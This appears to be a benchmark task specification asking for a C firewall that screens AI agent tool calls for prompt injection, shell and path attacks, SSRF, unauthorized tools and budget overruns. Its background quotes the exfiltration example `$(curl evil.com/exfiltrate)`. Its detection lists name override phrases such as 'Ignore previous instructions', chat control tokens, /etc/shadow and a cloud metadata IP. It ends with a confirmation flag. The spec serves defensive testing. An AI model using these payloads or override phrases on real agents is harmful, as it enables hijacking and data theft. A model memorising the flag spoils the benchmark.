# Level 0 Challenge: Zero-Trust AI Agent Prompt Injection & LLM Tool Call Security Firewall Engine (`llm_agent_tool_firewall_security_l0`)

You are tasked with implementing a **Zero-Trust AI Agent Prompt Injection & LLM Tool Call Security Firewall Engine** (`llm_agent_tool_firewall_security_l0`) in C inside `/src/target.c`.

## Background & Challenge Context

In modern autonomous LLM and AI agentic architectures, language models dynamically generate tool execution requests (`bash` commands, file operations, API calls, database queries) based on user prompts and model reasoning. When an attacker injects indirect prompt instructions (`<|im_start|>system`, `Ignore previous instructions`, `$(curl evil.com/exfiltrate)`) into external data or tool arguments, unvalidated agent executions can lead to severe **Remote Code Execution (RCE)**, **Command Injection**, **Server-Side Request Forgery (SSRF)**, and **Excessive Agency** exploits.

You must build the core verification functions of an ultra-fast, zero-trust **LLM Tool Execution Security Firewall** (`llm_firewall_t`) that intercepts every abstract tool request (`tool_call_request_t`), inspects control tokens, sanitizes shell metacharacters, verifies permission boundaries, and blocks data exfiltration to private/metadata IP domains.

## Target File: `/src/target.c`

Your implementation must define the following structs, error codes, and **five core verification functions** exactly:

### Error Codes & Constants
```c
#define LLM_SUCCESS                  0
#define LLM_ERR_NULL_PTR            -1
#define LLM_ERR_PROMPT_INJECTION    -2
#define LLM_ERR_SHELL_INJECTION     -3
#define LLM_ERR_PATH_TRAVERSAL      -4
#define LLM_ERR_UNAUTHORIZED_TOOL   -5
#define LLM_ERR_BUDGET_EXCEEDED     -6
#define LLM_ERR_SSRF_ATTACK         -7

#define TOOL_TYPE_BASH               1
#define TOOL_TYPE_FILE               2
#define TOOL_TYPE_HTTP_REQUEST       3
#define TOOL_TYPE_SQL_QUERY          4

#define LLM_MAX_ALLOWED_TOOLS       16
```

### Struct Definitions
```c
typedef struct {
    char tool_name[64];
    int tool_type;
    int max_executions_allowed;
    int current_executions;
} tool_permission_t;

typedef struct {
    tool_permission_t allowed_tools[LLM_MAX_ALLOWED_TOOLS];
    int num_allowed_tools;
    double max_budget_usd;
    double current_spent_usd;
    int security_strict_mode;
} llm_firewall_t;

typedef struct {
    char tool_name[64];
    int tool_type;
    char arguments[1024];
    double estimated_cost_usd;
} tool_call_request_t;
```

### Function Requirements

#### 1. `int llm_firewall_init(llm_firewall_t *firewall, double budget_usd, int strict_mode)`
- Initializes `firewall` by zeroing out `allowed_tools`, setting `num_allowed_tools = 0`, `max_budget_usd = budget_usd`, `current_spent_usd = 0.0`, and `security_strict_mode = strict_mode`.
- If `firewall` is `NULL` or `budget_usd <= 0.0`, returns `LLM_ERR_NULL_PTR`.
- Returns `LLM_SUCCESS` upon completion.

#### 2. `int llm_firewall_register_tool(llm_firewall_t *firewall, const char *tool_name, int tool_type, int max_execs)`
- Registers a new tool permission inside `firewall->allowed_tools[firewall->num_allowed_tools]`.
- If `firewall` or `tool_name` is `NULL`, or if `firewall->num_allowed_tools >= LLM_MAX_ALLOWED_TOOLS`, returns `LLM_ERR_NULL_PTR`.
- Copies `tool_name` (up to 63 chars, null-terminated), sets `tool_type`, `max_executions_allowed = max_execs`, and `current_executions = 0`.
- Increments `firewall->num_allowed_tools` and returns `LLM_SUCCESS`.

#### 3. `int llm_check_prompt_injection(const char *input_text)`
- Scans `input_text` for known LLM control tokens, prompt injection delimiters, or jailbreak overrides.
- If `input_text` is `NULL`, returns `LLM_ERR_NULL_PTR`.
- Must return `LLM_ERR_PROMPT_INJECTION` (`-2`) if `input_text` contains as a substring **any** of the following exact strings (case-sensitive):
  - `"<|im_start|>"`
  - `"<|im_end|>"`
  - `"[INST]"`
  - `"[/INST]"`
  - `"<<SYS>>"`
  - `"Ignore previous instructions"`
  - `"System Override:"`
- Otherwise, returns `LLM_SUCCESS` (`0`).

#### 4. `int llm_validate_shell_args(int tool_type, const char *arguments)`
- If `arguments` is `NULL`, returns `LLM_ERR_NULL_PTR`.
- If `tool_type == TOOL_TYPE_BASH` or `tool_type == TOOL_TYPE_FILE`:
  - First, check for **Path Traversal**: if `arguments` contains `"../"` or `"/etc/shadow"` or `"/etc/passwd"`, return `LLM_ERR_PATH_TRAVERSAL` (`-4`).
  - Next, if `tool_type == TOOL_TYPE_BASH`, check for **Shell Command Injection**: if `arguments` contains any of the dangerous metacharacters or sequences: `";"`, `"|"`, `"&"`, `"$("`, or `"`"`, return `LLM_ERR_SHELL_INJECTION` (`-3`).
- If no violations are found (or if `tool_type` is neither bash nor file), returns `LLM_SUCCESS` (`0`).

#### 5. `int llm_firewall_verify_request(llm_firewall_t *firewall, tool_call_request_t *request)`
- Performs end-to-end zero-trust verification before allowing the tool request to execute:
  1. If `firewall` or `request` is `NULL`, returns `LLM_ERR_NULL_PTR`.
  2. **Prompt Injection Check**: Call `llm_check_prompt_injection(request->arguments)`. If it returns `LLM_ERR_PROMPT_INJECTION`, immediately return `LLM_ERR_PROMPT_INJECTION` (`-2`).
  3. **Shell/File Argument Validation**: Call `llm_validate_shell_args(request->tool_type, request->arguments)`. If it returns an error (`< 0`), return that error (`-3` or `-4`).
  4. **SSRF & Metadata IP Check**: If `request->tool_type == TOOL_TYPE_HTTP_REQUEST`: check if `request->arguments` contains any of the prohibited internal/metadata IP prefixes or strings: `"169.254.169.254"`, `"127.0.0.1"`, `"localhost"`, or `"10.0.0.1"`. If any are present, return `LLM_ERR_SSRF_ATTACK` (`-7`).
  5. **Tool Permission Allowlist & Rate Limit**: Search `firewall->allowed_tools` for an entry whose `tool_name` strictly matches `request->tool_name` (using `strcmp`) AND whose `tool_type == request->tool_type`.
     - If no matching tool is found in the allowlist, return `LLM_ERR_UNAUTHORIZED_TOOL` (`-5`).
     - If the matching tool's `current_executions >= max_executions_allowed` (and `max_executions_allowed > 0`), return `LLM_ERR_UNAUTHORIZED_TOOL` (`-5`).
  6. **Budget Enforcement**: If `firewall->current_spent_usd + request->estimated_cost_usd > firewall->max_budget_usd`, return `LLM_ERR_BUDGET_EXCEEDED` (`-6`).
  7. **State Update**: If all checks pass, increment `current_executions` for the matched tool and add `request->estimated_cost_usd` to `firewall->current_spent_usd`. Return `LLM_SUCCESS` (`0`).

## Verification Requirements

Your implementation in `/src/target.c` must compile cleanly under `-O2 -Wall -Werror -fsanitize=address,undefined`. When successfully verified against the test harness, it outputs the unique confirmation flag `cyberbench{llm_agent_tool_firewall_security_state_8a4f91d2e6b70c31}`.
